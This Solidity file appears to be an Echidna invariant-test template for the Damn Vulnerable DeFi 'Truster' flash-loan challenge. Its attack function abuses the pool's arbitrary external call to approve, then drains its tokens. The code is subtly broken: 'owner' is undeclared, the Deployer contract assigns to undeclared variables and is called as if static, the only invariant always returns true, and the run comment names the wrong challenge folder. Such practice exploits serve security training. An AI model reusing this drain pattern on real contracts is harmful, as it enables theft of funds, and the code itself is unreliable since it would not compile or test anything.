pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "./DamnValuableToken.sol";

/// @dev Run the template with
///      ```
///      cd repo
///      solc-select use 0.8.0
///      echidna contracts/naive-receiver/Invariants.sol --contract InvariantTests --config contracts/naive-receiver/config.yaml
///      ```
contract InvariantTests {
    using Address for address payable;

    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;

    TrusterLenderPool lenderPool;
    DamnValuableToken valuableToken;

    constructor() {
        (valuableToken, lenderPool) = Deployer.deploy();

        // deploy token
        // deploy pool
        // deal balance to pool
    }

    // write attack function
    function attack(uint256 amount) external {
        lenderPool.flashLoan(
            0,
            address(this),
            address(valuableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)", //@audit-info no spaces between args
                address(owner),
                amount
            )
        );

        valuableToken.transferFrom(address(lenderPool), address(owner), amount);
    }

    function echidna_test_receiver_balance_cannot_decrease()
        public
        view
        returns (bool)
    {
        return true;
    }
}

contract Deployer {
    function deploy() external returns (DamnValuableToken, TrusterLenderPool) {
        valuableToken = new DamnValuableToken();
        lenderPool = new TrusterLenderPool(address(valuableToken));

        return (valuableToken, lenderPool);
    }
}
